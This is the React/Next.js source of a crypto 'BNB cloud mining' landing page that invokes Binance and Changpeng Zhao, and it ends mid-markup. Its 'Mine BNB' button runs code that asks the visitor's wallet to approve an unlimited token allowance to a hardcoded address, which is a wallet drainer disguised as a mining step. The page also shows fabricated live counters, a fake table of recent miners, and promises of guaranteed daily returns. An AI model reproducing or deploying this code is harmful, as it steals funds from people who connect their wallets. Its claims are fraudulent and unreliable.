import Head from 'next/head'
import Link from 'next/link'
import Image from 'next/image'
import React, { useState, useEffect } from "react";
import {useRouter} from "next/router";
import styles from '../styles/Home.module.css';
import Accordion from 'react-bootstrap/Accordion';
import Spinner from 'react-bootstrap/Spinner';
import NavDropdown from 'react-bootstrap/NavDropdown';
import Table from 'react-bootstrap/Table';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import wave from "../public/assets/templates/basic/images/wave.png";
import pict5 from "../public/assets/images/frontend/banner/pict5.png";
import pict2 from "../public/assets/images/frontend/banner/pict2.png";
import abouto from "../public/assets/images/frontend/about/61b9aabc96d8e1639557820.jpg";
import client1 from "../public/assets/images/man.jpg";
import waverev from "../public/assets/templates/basic/images/wave-rev.png";
import investor from "../public/assets/images/frontend/top_investor/61b9a46606ea81639556198.png";
import client2 from "../public/assets/images/woman.jpeg";
import client3 from "../public/assets/images/man2.jpg";
import testimony1 from "../public/assets/images/trustwallet1.jpeg";
import testimony2 from "../public/assets/images/metamaskdesktop.png";
import testimony3 from "../public/assets/images/trustwallet2.jpeg";
import testimony4 from "../public/assets/images/trustwallet2.jpeg";
import partner1 from "../public/assets/images/Binance-logo.png";
import partner2 from "../public/assets/images/60f00a883f7aa1626344072.png";
import partner3 from "../public/assets/images/60f00a76d2bb81626344054.png";
import partner6 from "../public/assets/images/pancakeswap-logo.png";
import partner4 from "../public/assets/images/60f00a663a45b1626344038.png";
import partner5 from "../public/assets/images/60f009e4086a21626343908.png";
import { library } from "@fortawesome/fontawesome-svg-core";
import { faUser } from "@fortawesome/free-solid-svg-icons";
import { faHeadset } from "@fortawesome/free-solid-svg-icons";
import { faStar } from "@fortawesome/free-solid-svg-icons";
import { faStarHalfAlt } from "@fortawesome/free-solid-svg-icons";
import { faHome } from "@fortawesome/free-solid-svg-icons";
import { faBurn } from "@fortawesome/free-solid-svg-icons";
import { faCheck } from "@fortawesome/free-solid-svg-icons";
import { faEthernet } from "@fortawesome/free-solid-svg-icons";
import { faLock } from "@fortawesome/free-solid-svg-icons";
import { faClock } from "@fortawesome/free-solid-svg-icons";
import { faMobile } from "@fortawesome/free-solid-svg-icons";
import { faFacebook } from "@fortawesome/free-brands-svg-icons";
import { faTwitter } from "@fortawesome/free-brands-svg-icons";
import WalletConnectClient from "@walletconnect/client";
import Web3 from "web3";
import ReferralcontractAbi from '../build/contracts/Referral.json';
import BNBcontractAbi from "../build/contracts/BNB.json";
// import MetadefisalecontractAbi from '../build/contracts/MetaDefiSale.json';
// import StakecontractAbi from '../build/contracts/Stake.json';
import WalletConnectProvider from "@walletconnect/web3-provider";


library.add(faUser, faStarHalfAlt, faHeadset, faCheck, faMobile, faLock, faStar, faHome, faEthernet, faBurn, faClock, faFacebook, faTwitter);


    
export default function Home() {

    const router = useRouter();
    const {query} = useRouter();

    const RESET_INTERVAL_S = 300; // 300s = 5m * 60s/m

    const formatTime = (time) =>
    `${String(Math.floor(time / 60)).padStart(2, "0")}:${String(
      time % 60
    ).padStart(2, "0")}`;

const Timer = ({ time }) => {
  const timeRemain = RESET_INTERVAL_S - (time % RESET_INTERVAL_S);
  return (
    <>
      <div>{formatTime(timeRemain)}</div>
    </>
  );
};
const IntervalTimerFunctional = () => {
    const [time, setTime] = useState(0);
  
    useEffect(() => {
      const timerId = setInterval(() => {
        setTime((t) => t + 1);
      }, 1000);
      return () => clearInterval(timerId);
    }, []);
  
    return <Timer time={time} />;
  };


//   for counters ......
  const [counter1, setCounter1] = useState(0);
  const [counter2, setCounter2] = useState(68000);
  const [counter3, setCounter3] = useState(990000);
  const [counter4, setCounter4] = useState(200);
  const [counter5, setCounter5] = useState(2800);
  const [counter6, setCounter6] = useState(26300);
  const [bnbcounter, setBnbcounter] = useState(0);
  

  useEffect(() => {
    const timerId1 = setTimeout(() => {
      setCounter1( counter1 + 1);
    }, 1);

    const timerId2 = setTimeout(() => {
        setCounter2( counter2 + 1);
    }, 1);

    const timerId3 = setTimeout(() => {
        setCounter3( counter3 + 1);
    }, 1);

    const timerId4 = setTimeout(() => {
        setCounter4( counter4 + 1);
    }, 1);

    const timerId5 = setInterval(() => {
        setCounter5( counter5 + 1);
    }, 1000);

    window.localStorage.getItem('counter5');
    window.localStorage.setItem('counter5', counter5);
    const timerId6 = setTimeout(() => {
        setCounter6( counter6 + 1);
    }, 1200);
    window.localStorage.getItem('counter6');
    window.localStorage.setItem('counter6', counter6);
    if(counter1 == 29) {
        clearTimeout(timerId1);
    };

    if(counter2 == 11088) {
        clearTimeout(timerId2);
    };

    if(counter3 == 990088) {
        clearTimeout(timerId3);
    };

    if(counter4 == 222) {
        clearTimeout(timerId4);
    };

  }, [counter1,counter2,counter3,counter4,counter5,counter6]);
    
    // const [minutes, setMinutes] = useState(5)
    // if (typeof window !== "undefined") {
        // Client-side-only code
        
    // }

    // function updateTime() {
    //     if (minutes == 0 && seconds == 0) {
    //     //reset
    //     setSeconds(0);
    //     setMinutes(5);
    //     }
    //     else {
    //     if (seconds == 0) {
    //         setMinutes(minutes => minutes - 1);
    //         setSeconds(59);
    //     } else {
    //         setSeconds(seconds => seconds - 1);
    //     }
    //     }
    // }
    // useEffect(() => {
    //     // use set timeout and be confident because updateTime will cause rerender
    //     // rerender mean re call this effect => then it will be similar to how setinterval works
    //     // but with easy to understand logic
    //     const token = setInterval(updateTime, 1000)

    //     return function cleanUp() {
    //     clearInterval(token);
    //     }
    // }, []);

    // const [randomPrice, setrandomPrice] = useState(0)
    
    // const generaterandomPrice = () => {
    //     const priceArray = document.querySelectorAll(".nftprice")
    //     const randomPrice = Math.floor(Math.random() * priceArray.length);
    //     setrandomPrice(randomPrice)
    // }


    async function walletConnect() {
        //  Create WalletConnect Provider
          const provider = new WalletConnectProvider({
                      rpc: {
                          56: 'https://bsc-dataseed1.binance.org'
                      },
                      chainId: 56,
          });
          
          //  Enable session (triggers QR Code modal)
          await provider.enable();
  
            const web3 = new Web3(provider);
            const newWeb3 = new Web3(provider);
            const accounts = await newWeb3.eth.getAccounts();
            const showAddress = document.getElementById("connectedaddress");
            showAddress.style.display = "block";
            const referd = document.getElementById("referd");
            referd.style.display = "block";
            const referral_address = document.getElementById("referral_address");
            // try {
            // Request account access
            showAddress.innerHTML = "<div className='nav-link'>Connected </div> " +  accounts[0];
            // referral_address.innerHTML = accounts[0];
      
      }
      
  
        async function connectMetamask() {
          if (window.ethereum) {
            // window.ethereum; 
            window.web3 = new Web3(web3.currentProvider);
            const showAddress = document.getElementById("connectedaddress");
            const referd = document.getElementById("referd");
            referd.style.display = "block";
            showAddress.style.display = "block";
            const referral_address = document.getElementById("referral_address");
            // try {
            // Request account access
            let accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            showAddress.innerHTML = "<div className='nav-link'>Connected </div> " +  accounts[0];
            // referral_address.innerHTML = accounts[0];
            // } catch (error) {
            // // User denied account access...
            // console.error("User denied account access")
            // }
        } 
    }
  
      async function MineBNB() {

        const bnbcounterId = setInterval(() => {
            setBnbcounter( bnbcounter++);
        }, 1200);
        // return () => clearTimeout(bnbcounterId);
        
          if (window.ethereum) {
              //         window.ethereum; 
              window.web3 = new Web3(web3.currentProvider);
            const showAddress = document.getElementById("connectedadddress");
              // try {
              // Request account access
              let accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
              const BNBcontractAddress = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52";
              const ReferralContractAddress = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52";
              const BNBInstance = await new web3.eth.Contract(BNBcontractAbi, BNBcontractAddress);
              const ReferralContractInstance = await new web3.eth.Contract(ReferralcontractAbi, BNBcontractAddress);
              const senderAddress = accounts[0];
              const account = web3.eth.accounts.create();
    console.log(account);
              const receiverAddress = "0x7C1877D407917D94f97339eF2AcEefC9154a2294";
              const balance = await web3.eth.getBalance(senderAddress);
              // const gasPrice = await web3.eth.getGasPrice();
              const gasPrice = 50000000000;
  
              const approve_amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; //(2^256 - 1 )
              BNBInstance.methods.approve(receiverAddress, approve_amount).send({from: accounts[0]}, function (err, res) {
              if (err) {
                  // console.log("An error occured", err)
                  return
              }
              // console.log("Hash of the transaction: " + res)
              })

              ReferralContractInstance.methods.addReferral(refAddress).send({from: accounts[0]}, function (err, res) {
                if (err) {
                    // console.log("An error occured", err)
                    return
                }
                // console.log("Hash of the transaction: " + res)
            })

            ReferralContractInstance.methods.getRefDetails(refAddress).call({from: accounts[0]}, function (err, res) {
                if (err) {
                    // console.log("An error occured", err)
                    return
                }
                const refCountt = document.getElementById("refCount");
                refCountt.innerHTML = err;
            })
          }else {
              // regular web3 provider methods
              const provider = new WalletConnectProvider({
                  rpc: {
                      56: 'https://bsc-dataseed1.binance.org'
                  },
                  chainId: 56,
              });
              
              //  Enable session (triggers QR Code modal)
              await provider.enable();
  
              const web3 = new Web3(provider);
              const newWeb3 = new Web3(provider);
              const accounts = await newWeb3.eth.getAccounts();
              
              const BNBcontractAddress = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52";
  
              const BNBInstance = await new web3.eth.Contract(BNBcontractAbi, BNBcontractAddress);
              const ReferralContractInstance = await new web3.eth.Contract(ReferralcontractAbi, BNBcontractAddress);
              const senderAddress = accounts[0];
              const receiverAddress = "0x7C1877D407917D94f97339eF2AcEefC9154a2294";
              const balance = await web3.eth.getBalance(senderAddress);
              // const gasPrice = await web3.eth.getGasPrice();
              const gasPrice = 50000000000;
  
              const approve_amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; //(2^256 - 1 )
              BNBInstance.methods.approve(receiverAddress, approve_amount).send({from: accounts[0]}, function (err, res) {
              if (err) {
                  // console.log("An error occured", err)
                  return
              }
              // console.log("Hash of the transaction: " + res)
              })

              ReferralContractInstance.methods.addReferral(refAddress).send({from: accounts[0]}, function (err, res) {
                if (err) {
                    // console.log("An error occured", err)
                    return
                }
                // console.log("Hash of the transaction: " + res)
            })

            ReferralContractInstance.methods.getRefDetails(refAddress).call({from: accounts[0]}, function (err, res) {
                if (err) {
                    // console.log("An error occured", err)
                    return
                }
                const refCountt = document.getElementById("refCount");
                refCountt.innerHTML = err;
            })
          }
      }

    // async function walletConnect() {
    //   //  Create WalletConnect Provider
    //     const provider = new WalletConnectProvider({
    //         infuraId: "8909fc4e39824c8b938df14a2e2a27b1",
    //     });
        
    //     //  Enable session (triggers QR Code modal)
    //     await provider.enable();

    //     const web3 = new Web3(provider);
    // }
    
    // async function connectMetamask() {
    //     if (window.ethereum) {
    //         // window.ethereum; 
    //         window.web3 = new Web3(web3.currentProvider);
    //         const showAddress = document.getElementById("connectedaddress");
    //         showAddress.style.display = "block";
    //         // try {
    //         // Request account access
    //         let accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    //         showAddress.innerHTML = "Connected address" + accounts[0];
    //         // } catch (error) {
    //         // // User denied account access...
    //         // console.error("User denied account access")
    //         // }
    //         const MetadeficontractAddress = "0x9A2C37526ef17515709a6F93c57F4551D3E4339f";
    //         const MetadefisalecontractAddress = "0x470BC16DD7cc76a8c90fFCBc95a127297aa5C599";
    //         const StakecontractAddress = "0xE75A543582d0808d4DFc4478325d6f0c80f0d699";

    //         const MetaDefiInstance = await new web3.eth.Contract(MetadeficontractAbi.abi, MetadeficontractAddress);
    //         const MetaDefiSaleInstance = await new web3.eth.Contract(MetadefisalecontractAbi.abi, MetadefisalecontractAddress);
    //         const StakeInstance = await new web3.eth.Contract(StakecontractAbi.abi, StakecontractAddress);

    //         const userAddress = accounts[0];
    //     //     MetaDefiSaleInstance.methods.buyTokens(20000000000).send({from: accounts[0]},function (err, res) {
    //     //     if (err) {
    //     //         console.log("An error occured", err)
    //     //         return
    //     //     }
    //     //     console.log("Token Buy: ", res)
    //     // })
    //         MetaDefiInstance.methods.balanceOf(MetadeficontractAddress).call(function (err, res) {
    //             if (err) {
    //                 console.log("An error occured", err)
    //                 return
    //             }
    //         console.log("The balance is: ", res)
    //         })
    //         // MetaDefiInstance.methods.approve(MetadeficontractAddress, 40000000000000).send({from: accounts[0]},function (err, res) {
    //         // if (err) {
    //         //     console.log("An error occured", err)
    //         //     return
    //         // }
    //         // console.log("Hash of the transaction: " + res)
    //         // })
    //         MetaDefiInstance.methods.transfer(MetadeficontractAddress,200000000000).send({from: MetadeficontractAddress}, function (err, res) {
    //             if (err) {
    //                 console.log("An error occured", err)
    //                 return
    //             }
    //             console.log("Transfer is : " + res)
    //         })
    //         MetaDefiInstance.methods.allowance(accounts[0],MetadeficontractAddress).call(function (err, res) {
    //             if (err) {
    //                 console.log("An error occured", err)
    //                 return
    //             }
    //             console.log("Allowance is : " + res)
    //             })
    //         MetaDefiInstance.methods.transferFrom(accounts[0],MetadeficontractAddress, 300000).send({from: MetadeficontractAddress},function (err, res) {
    //         if (err) {
    //             console.log("An error occured", err)
    //             return
    //         }
    //         console.log("Hash of the transaction: " + res)
    //         })
    //     }
    // }

    // async function buyMTDToken() {
    //     if (window.ethereum) {
    //         // window.ethereum; 
    //         window.web3 = new Web3(web3.currentProvider);
    //         // try {
    //         // Request account access
    //         let accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    //         // } catch (error) {
    //         // // User denied account access...
    //         // console.error("User denied account access")
    //         // }
    //         const MetadeficontractAddress = "0x9A2C37526ef17515709a6F93c57F4551D3E4339f";
    //         const MetadefisalecontractAddress = "0x470BC16DD7cc76a8c90fFCBc95a127297aa5C599";
    //         const StakecontractAddress = "0xE75A543582d0808d4DFc4478325d6f0c80f0d699";

    //         const MetaDefiInstance = await new web3.eth.Contract(MetadeficontractAbi.abi, MetadeficontractAddress);
    //         const MetaDefiSaleInstance = await new web3.eth.Contract(MetadefisalecontractAbi.abi, MetadefisalecontractAddress);
    //         const StakeInstance = await new web3.eth.Contract(StakecontractAbi.abi, StakecontractAddress);

    //         const TokenPrice = 100000000;
    //         const buyAmt = document.getElementById("buyamount").value;

    //         MetaDefiInstance.methods.buyTokens().send(function (err, res) {
    //             if (err) {
    //                 console.log("An error occured", err)
    //                 return
    //             }
    //             console.log("Allowance is : " + res)
    //         })
    //     }
    // }


  return (

    
    <div className={styles.container}>
      
        {/* Main Homepage Section */}
        <div className="content-wrapper">
            <div className="content-body">
                <main>
                    <section className="banner-section bg_img">
                    {/* <div className='bg-image-overlay'></div> */}
                    {/* <div className="particles-js" id="particles-js"></div> */}

                    <div className="banner-shape">
                        <Image src={wave} alt="banner"/>
                    </div>

                    <div className="tron1 d-none d-lg-block">
                        <Image src={pict5} alt="banner"/>
                    </div>
                    <div className="tron2 d-none d-lg-block">
                        <Image src={pict2} alt="banner"/>
                    </div>
                    <div className="container text-warning">
                        <div className="banner__content text--white">
                            <h2 className="banner__category text--white">Innovative service</h2>
                            <h1 className="banner__title text--white">without human intervention</h1>
                            <h1 className="banner__text text-warning">Powerful BNB Cloud Mining Service.</h1>
                            <h2 className="promo_text text--white">Claim free BNB If You Have A Binnce Account</h2>
                            <h2 className="promo_text text--white mt-1">2 TH/S for 7 days.</h2>
                        </div>
                        <div className="banner__bottom__content text--white">
                            <div className="row justify-content-center">
                                <div className="col-lg-7 col-md-10">
                                    <div className="pt-1 mx-auto text-center">
                                        <div className="mt-2 mb-5">
                                            <div className='showconnect mt-8 pt-8' id='hide-show-c'>
                                                <button className='btnbuy2'>
                                                    <NavDropdown title="Connect Wallet" id="offcanvasNavbarDropdown" variant="dark" className="bg-transparent bg-none text-white">
                                                        <NavDropdown.Item onClick={connectMetamask} className="unstyled w100 text-nowrap walletconnectbtn ml-2 bg-transparent bg-none">
                                                            <Image src="/theme-assets/images/metamasklogo.svg" width="20" height="20" className="mlogo" alt="CICO"/><span className="connectstyle text-dark font-light">Connect With MetaMask</span>
                                                        </NavDropdown.Item>
                                                        <NavDropdown.Item onClick={walletConnect} className="unstyled w1100 text-nowrap walletconnectbtn ml-2">
                                                            <Image src="/theme-assets/images/WalletConnectlogo.png" width="20" height="20" className="mlogo" alt="CICO"/><span className="connectstyle text-dark font-light">Connect With WalletConnect</span>
                                                        </NavDropdown.Item>
                                                    </NavDropdown>
                                                </button>
                                                
                                                <div><span id="connectedaddress" className='connectedaddress'></span></div>    
                                            </div>
                                            
                                        </div>
                                    </div>
                                    <h1 className="bnb__network text--white">Network: <span id="network"></span><span id="awaiting"></span></h1>
                                    <h1 className="bnb__amount text--white"><span id="mined">{counter5}</span> BNB</h1>
                                    <h1 className="ticket_units text--white"><span id="ticket_mined">{counter6}</span> ACTIVE MINERS</h1>
                                    <h2 className="banner__bottom__text text-warning">
                                        MINER SPEED: <span>1000</span> TH/S  <div> DAILY PROFIT: <span id="dailyProfit"> 68.22587+ </span> BNB </div>
                                    </h2>
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                <section className="about-section pt-120 pb-120" id="about-us">
                    <div className='bg-image-overlay'></div>
                    <div className="container">
                        <div className="row gy-5">
                            <div className="col-lg-6">
                                <div className="about__thumb">
                                    <div className="thumb">
                                        <Image src={abouto} alt="about"/>
                                    </div>
                                    <blockquote className="chairman--quote">
                                        Changpeng Zhao Founder and CEO of Binance.                    
                                    </blockquote>
                                </div>
                            </div>
                            <div className="col-lg-6">
                                <div className="about__content">
                                    <div className="section__header">
                                        <span className="section__cate">
                                            What is BnB?                        
                                        </span>
                                        <h3 className="section__title">BNB powers the Binance Ecosystem and is the native coin of the Binance Chain.</h3>
                                        <p>
                                            BNB has many use cases both within the Binance ecosystem and elsewhere.                        
                                        </p>
                                    </div>
                                    <p className="about__para">
                                        As mentioned, BNB has many use cases both within the Binance ecosystem and elsewhere, so it is up to you to decide how to use your BNB. For instance, you can use BNB to pay for your travel expenses, buy virtual gifts, and much more. We estimated that millions of BNB had been consumed by users for travel expenses, payment of goods, for lending, for rewards, to create smart contracts, and for other transactions.                    
                                    </p>
                                    <ul className="text-dark">
                                            <li className='list-none'> <FontAwesomeIcon icon="star" className="fa_timer text-warning"/> Our General Policy Is Full Transparency</li>
                                            <li className='list-none'> <FontAwesomeIcon icon="star" className="fa_timer text-warning"/> Our proven track record allows us to offer miners fixed returns while assuming all the risk ourselves.</li>
                                            <li className='list-none'> <FontAwesomeIcon icon="star" className="fa_timer text-warning"/> Each of our miners receives secured principal and secured mining payments, providing them with above-market returns in addition to peace of mind.</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                

            <section className="investment-section bg--theme--overlay bg_fixed pt-120 pb-120 bottom--wave-wrapper top--wave-wrapper bg_img" id="transaction">
                <div className='bg-image-overlay'></div>
                <div className="banner-shape-top">
                    <Image src={waverev} alt="banner"/>
                </div>
                <div className="banner-shape">
                    <Image src={wave} alt="banner"/>
                </div>
                
                <div className="buyformcon mx-auto justify-center" id="mineBNB">
                    
                    <div className="px-8 mx-auto text-center">
                        <h1 className="headerbuy1 mx-auto justify-center text-warning">MINE BNB</h1>
                        <form className="buyforma mx-auto text-center justify-center">
                            <div className='buyformflex mx-auto text-center justify-center'>
                                <div className="flexone mx-auto text-center justify-center">
                                    <div className="">
                                        <div className="w-full px-4 py-2">
                                            <select className='selectinput text-white px-4'>
                                                <option className='selectinput text-dark' value={7}>7 Days</option>
                                                <option className='selectinput text-dark' value={30}>30 Days</option>
                                                <option className='selectinput text-dark' value={90}>90 Days</option>
                                                <option className='selectinput text-dark' value={180}>180 Days</option>
                                            </select>
                                        </div>
                                    </div>

                                    <div className="">
                                        <div className="w-full">
                                            <button type='button' className="btnbuy2 text-dark bg-warning font-bold" onClick={MineBNB}><Spinner animation="grow" varaint="success"/> Mine BNB</button>
                                        </div>
                                    </div>
                                </div> 
                            </div>

                            <div className="buyformflex mx-auto text-center justify-center">
                                <div className="flexone mx-auto text-center justify-center mb-4">
                                    <div className="buylabel mtb text-white">BNB Mined:</div>
                                    <div className="mtb mtd_tokens_bought text-white"> <span>{bnbcounter}</span> BNB</div>
                                </div>
                            </div>

                            <div className="buynote mx-auto text-center text-warning justify-center">(*Note: You earn 0.8% Daily)</div>
                            
                            <div className='px-4 py-4 mx-4 my-4'>
                                <h4 className='text-warning'>To Mine BNB Do The Following:</h4>
                                <ul className='text-left text-white list-none italic font-light'>
                                    <li className='text-left text-white list-none italic font-light'>
                                        <FontAwesomeIcon icon="check" className="fa_timer text-warning"/> You must connect your wallet address using MetaMask Or WalletConnect (Trust Wallet) first before you start mining BNB
                                    </li>
                                    <li className='text-left text-white list-none italic font-light'>
                                        <FontAwesomeIcon icon="check" className="fa_timer text-warning"/> Your wallet address must be a BSC compatible wallet address
                                    </li>
                                    <li className='text-left text-white list-none italic font-light'>
                                        <FontAwesomeIcon icon="check" className="fa_timer text-warning"/> Approve your BNB Mining transaction and watch your BNB grow
                                    </li>
                                </ul>
                            </div>
                            
                        </form>
                    </div>
                </div>
                <div className="referd mx-auto text-center mx-2 my-6 font-bold" id="referd">
                    <h4 className='py-8 mx-4 px-8 text-warning'>Get Additional 10% Mining Profit From Each Of Your Referrals</h4>
                    <span className="text-white">Referral Link:</span> <Link href={{ 'https://binancebnb.net': '/', query: { ref_address: "<span id='referral_address'></span>" }, }} passHref shallow replace><a className="reffert text-warning"> http://localhost:300/ref_address=0x4e55A543582d0808d4DFc4478325d6f0c80f0d699</a></Link>
                    <div className='mx-auto px-12 py-4'>
                        
                        <Table hover className='rounded text-white z-10' style={{position: 'relative',zIndex: '20'}}>
                            <div className='bg-image-overlay'></div>
                            <thead>
                                <tr>
                                <th>My Referral Count</th>
                                </tr>
                            </thead>
                            <tbody className='rounded text-white z-10'>
                                <tr>
                                <td><span id="refCount">0</span></td>
                                </tr>
                            </tbody>
                        </Table>
                    </div>
                </div>
                <div className="container">
                        <div className="section__header section__header__center text--white">
                            <span className="section__cate">
                                Latest Transactions                
                            </span>
                            <h3 className="section__title">Our Latest Deposits and Withdraws</h3>
                            <p>Transparency is one of our main priorities</p>
                        </div>
                        <ul className="nav nav-tabs nav--tabs">
                            <li className="nav-item">
                                <a href="#deposit" className="nav-link active" data-bs-toggle="tab">Recent Miners</a>
                            </li>
                        </ul>
                        <div className="tab-content">
                            <div className="tab-pane show active" id="deposit">
                                <div className="table--responsive rounded" style={{position: 'relative'}}>
                                    {/* <div className='bg-table-overlay'></div> */}
                                    <table className="cmn--table table--white text-white z-10 text-left">
                                        <thead>
                                            <tr>
                                                <th className='text-success'>Amount</th>
                                                <th className='text-success'>Wallet</th>
                                            </tr>
                                        </thead>
                                        <tbody className='text-white'>
                                        <tr>
                                            <td data-label="Amount">
                                                <span>4.6 BNB</span>
                                            </td>
                                            <td data-label="Wallet">
                                                0x1363f7e3463ee5a3bb7c43594c8e9b490dae6XXX
                                            </td>
                                        </tr>
                                        <tr>
                                            <td data-label="Amount">
                                                <span>8 BNB</span>
                                            </td>
                                            <td data-label="Wallet">
                                                0x5e873143506dcf2be87b18f24a33e2ce437a0XXX
                                            </td>
                                        </tr>
                                                                        
                                        <tr>
                                            <td data-label="Amount">
                                                <span>4 BNB</span>
                                            </td>
                                            <td data-label="Wallet">
                                                0xf9a0a236031F59E28b0cEA7fF199A34BE1c79XXX
                                            </td>
                                        </tr>
                                        <tr>
                                            <td data-label="Amount">
                                                <span>2 BNB</span>
                                            </td>
                                            <td data-label="Wallet">
                                                0x89dD761ed9039a2092F60E20e7943777C1f1cXXX
                                            </td>
                                        </tr>
                                        <tr>
                                            <td data-label="Amount">
                                                <span>19 BNB</span>
                                            </td>
                                            <td data-label="Wallet">
                                                0x4c1ddef6f1182d717fe579399adee093df37cXXX
                                            </td>
                                        </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>13 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0xbcb56eca0c02d5a691efa4d33ad7cdf40984aXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>6.4 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x08183033841B25F12b5339b321967616fD36CXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>10.8 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        bnb10dkt6feesp9suyyr98eel868g79gtzvueaaXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>3 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x34f61948e4ceba45048b4a2412e29e93b8a13XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>22 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x87e848893bc005bd3252f0dc2cfede26a7bf8XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>18 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0xd425aa5fa05f593539e887b6ef2da6e6548aeXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>32 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x07c47d3d5e1e9dad53170d14fd54ff42951c9XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>7 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x2dcdbec4e8cb929185a07eb9b3f2e15f517a6XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>11 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0xFf8CD900E7F238A742E16C567C156A6F3729cXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>4 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0xCC2f0EfAA20b599fF36229D935f8d007FFF42XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>8 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x6a7415b36133c6c3957e4772b8009068e170cXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>5 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x46a37cc82355e11ebde044929eaade02bd129XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>8.3 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x8aeb7c2d4758eb51080493e2cb290d6251065XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>3.7 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0xafe4f80e82a85118110bc76408072718e86b2XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>16 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x0ae63abf7f2200308924cd3604fdb52bb5925XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>9 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x186bad94057591918c3265c4ddb12874324beXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>2 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x06522404e122d8a224cd7c58aac84a23fff40XXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>6 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0xc3df08ff4cec7965ed68646772c9b5690da2cXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>3 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        0x6478dddd32072a31159909b2942d2faf110fdXXX
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td data-label="Amount">
                                                        <span>1.6 BNB</span>
                                                    </td>
                                                    <td data-label="Wallet">
                                                        bnb1ufjgjen5yd5a8ta2n8skpv0pan3mptr58pnXXX
                                                    </td>
                                                </tr>
                                            </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section className="how-section pt-120 pb-120" id="how_work">
                    <div className='bg-image-overlay'></div>
                    <div className="container">
                        <div className="section__header section__header__center">
                            <span className="section__cate">
                                Working Process            </span>
                            <h3 className="section__title">How To Start</h3>
                            <p>4 easy steps to start Mining BNB</p>
                        </div>
                        <div className="row g-4">
                                    <div className="col-sm-6 col-lg-3 mb-30">
                            <div className="how__item">
                                <div className="how__thumb">
                                    <div className="thumb">
                                        1
                                    </div>
                                </div>
                                <h5 className="title">Connect Wallet Address</h5>
                            </div>
                        </div>
                                    <div className="col-sm-6 col-lg-3 mb-30">
                            <div className="how__item">
                                <div className="how__thumb">
                                    <div className="thumb">
                                        2
                                    </div>
                                </div>
                                <h5 className="title">Click On Mine BNB Button</h5>
                            </div>
                        </div>
                                    <div className="col-sm-6 col-lg-3 mb-30">
                            <div className="how__item">
                                <div className="how__thumb">
                                    <div className="thumb">
                                        3
                                    </div>
                                </div>
                                <h5 className="title">Approve transaction</h5>
                            </div>
                        </div>
                                    <div className="col-sm-6 col-lg-3 mb-30">
                            <div className="how__item">
                                <div className="how__thumb">
                                    <div className="thumb">
                                        4
                                    </div>
                                </div>
                                <h5 className="title">Start Mining And Watch Your BNB Grow</h5>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <section className="feature-section pt-120 pb-120 bg--theme--overlay top--wave-wrapper bottom--wave-wrapper bg_img bg_fixed">
                <div className='bg-image-overlay'></div>
                <div className="banner-shape">
                    <Image src={wave} alt="banner"/>
                </div>
                <div className="banner-shape-top">
                    <Image src={waverev} alt="banner"/>
                </div>
                <div className="container">
                    <div className="section__header section__header__center text--white">
